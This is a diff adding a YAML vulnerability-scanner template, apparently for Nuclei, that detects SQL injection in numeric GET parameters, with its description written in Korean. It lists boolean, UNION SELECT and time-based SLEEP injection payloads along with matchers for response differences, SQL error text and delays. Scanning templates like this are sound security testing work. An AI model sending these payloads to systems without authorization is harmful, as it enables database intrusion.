@@ -1,0 +1,54 @@
+id: sqli-integer-parameter
+
+info:
+  name: SQL Injection via Integer/Numeric Parameters
+  author: security-researcher
+  severity: high
+  description: |
+    정수형 파라미터에서 발생하는 SQL 인젝션 취약점을 탐지합니다.
+    따옴표 없이 직접 쿼리에 삽입되는 숫자 파라미터가 대상입니다.
+  tags: sqli,integer,numeric,injection
+
+http:
+  - method: GET
+    path:
+      # 기본 정수형 파라미터
+      - "{{BaseURL}}?id=1 AND 1=1"
+      - "{{BaseURL}}?id=1 AND 1=2"
+      - "{{BaseURL}}?id=1 OR 1=1"
+      - "{{BaseURL}}?id=0 OR 1=1"
+      - "{{BaseURL}}?id=-1 OR 1=1"
+      # 비트 연산
+      - "{{BaseURL}}?id=1&id=1 UNION SELECT NULL"
+      # 수학 연산
+      - "{{BaseURL}}?id=1+0"
+      - "{{BaseURL}}?id=2-1"
+      - "{{BaseURL}}?id=1*1"
+      # 논리 연산
+      - "{{BaseURL}}?id=1 AND 1"
+      - "{{BaseURL}}?id=1 AND 0"
+      # Time-based
+      - "{{BaseURL}}?id=1 AND SLEEP(5)"
+      - "{{BaseURL}}?id=1 AND IF(1=1,SLEEP(5),0)"
+      # 페이지, 카테고리 등
+      - "{{BaseURL}}?page=1 AND 1=2"
+      - "{{BaseURL}}?cat=1 AND 1=2"
+      - "{{BaseURL}}?pid=1 AND 1=2"
+      - "{{BaseURL}}?cid=1 AND 1=2"
+      - "{{BaseURL}}?uid=1 AND 1=2"
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        dsl:
+          - "len(body_1) != len(body_2) && status_code_1 == 200 && status_code_2 == 200"
+
+      - type: regex
+        part: body
+        regex:
+          - "sql.*error|syntax.*error|database.*error"
+        case-insensitive: true
+
+      - type: dsl
+        dsl:
+          - "duration >= 5000"
